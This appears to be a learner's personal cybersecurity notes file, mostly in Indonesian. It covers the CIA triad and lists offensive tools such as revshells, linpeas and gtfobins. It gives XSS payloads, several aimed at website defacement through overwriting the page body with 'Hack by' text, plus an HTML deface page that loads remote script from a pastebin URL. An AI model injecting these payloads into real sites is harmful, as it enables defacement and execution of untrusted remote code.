# cyber security

# CIA Triagle
- CIA Triagle => Confidentiality, Integrity, and Availability.
    - Confidentiality
        - siapa yang boleh mengakses data / informasi tersebut

    - Integrity
        - apa saja yang boleh dilakukan terhadap data / informasi tersebut

    - Availability.
        - bagaimana akses data terhadap data atau informasi

# Tool web
- cyberchef => encode, decode
- dcode => ecnrpysi, decrpysi(chiper)
- revshells => revshell connector
- full ttys => untuk memperbagsu shell
- linpeas => check system vulnerabilty in target server (use in terminal target)
- gtfobins => 

# XSS
- XSS -> 
```
<script>alert("test")</script>
document.documentElement.innerHTML=String.fromCharCode()
<script>document.body.innerHTML = "<h1>Hack by *****</h1>"</script>
<script>document.body.innerHTML = ""</script>
```

- deface trial
    - pastebin/raw =>
    - https://dark-people-team.blogspot.com/2019/08/script-jso-creator-written-by-mine7.html
        ```
        document.body.innerHTML=String.fromCharCode()
        ```
        ```
        <html>
            <head>
                <title>hack by ....</title>
            </head>
            <body>
                <script type="text/javascript" src="https://pastebin.com/raw/awPKPXeK"></script>
            </body>
        </html>
        ```

# JSO
- JSO => 
```
jso
```